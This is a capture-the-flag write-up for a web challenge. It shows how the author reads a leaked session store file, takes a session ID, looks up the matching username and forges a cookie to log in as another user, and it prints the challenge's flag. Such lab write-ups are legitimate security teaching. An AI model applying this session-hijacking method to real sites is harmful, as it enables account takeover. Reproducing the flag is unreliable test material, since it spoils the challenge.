# Challenge Name:
 [*The Restricted Sessions*](https://cybertalents.com/challenges/web/the-restricted-sessions)
 
# Challenge Description
Flag is restricted to logged users only , can you be one of them.

Link: [http://34.77.37.110/restricted-sessions/](http://34.77.37.110/restricted-sessions/)

## Answer
* Open inspect from (ctrl + shift + c) then scroll down there is a script compare session id with phpsessid
```
<script type="text/javascript">

      if(document.cookie !== ''){
        $.post('getcurrentuserinfo.php',{
          'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1]
        },function(data){
          cu = data;
        });
      }
</script>
```
* Open Burb Suite to intercept requests (there isn't cookie on it)
* Send request to repeater, then add some cookie
```
Cookie: PHPSESSID=test
```
Response:
```
Session not found in data/session_store.txt
```
* He store session ids in this file let's see it
* Change 'test' in the previous request to an id from this file
Response:
```
UserInfo Cookie don't have the username , Validation failed 
```
* Cookie must contain username but if we try random one it will not work
* From JavaScript code it get user info by sending post request to 'getcurrentuseringo.php' (notice that it is get now so you must change method)
```
GET /restricted-sessions/getcurrentuseringo.php?PHPSESSID=iuqwhe23eh23kej2hd2u3h2k23 HTTP/1.1
```
```
"name":"john",
"email":"john@example.com",
"session_id":"iuqwhe23eh23kej2hd2u3h2k23"
```
* Now add username to Cookie then send
* You got the Flag!!

 ## The Flag
 > sessionareawesomebutifitsecure 
